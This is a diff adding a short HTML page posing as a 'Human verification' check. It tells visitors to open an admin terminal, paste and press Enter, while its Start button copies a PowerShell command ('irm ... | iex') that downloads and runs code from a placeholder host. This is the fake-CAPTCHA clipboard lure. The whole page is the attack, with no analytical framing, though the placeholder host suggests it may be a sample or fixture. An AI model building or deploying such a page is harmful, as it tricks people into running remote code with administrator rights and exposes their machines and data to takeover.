@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Human verification</title>
+  </head>
+  <body>
+    <h2>Complete these steps</h2>
+    <ol>
+      <li>Press Win + X and choose Terminal (Admin)</li>
+      <li>Press Ctrl + V</li>
+      <li>Press Enter</li>
+    </ol>
+    <button id="go">Start</button>
+    <script>
+      // A plain download-and-run with no tricks, only the instructions give it away.
+      const payload = 'irm https://x.example.invalid/a | iex';
+      document.getElementById('go').addEventListener('click', async () => {
+        try {
+          await navigator.clipboard.writeText(payload);
+          document.title = 'written';
+        } catch (e) {
+          document.title = 'error ' + e;
+        }
+      });
+    </script>
+  </body>
+</html>
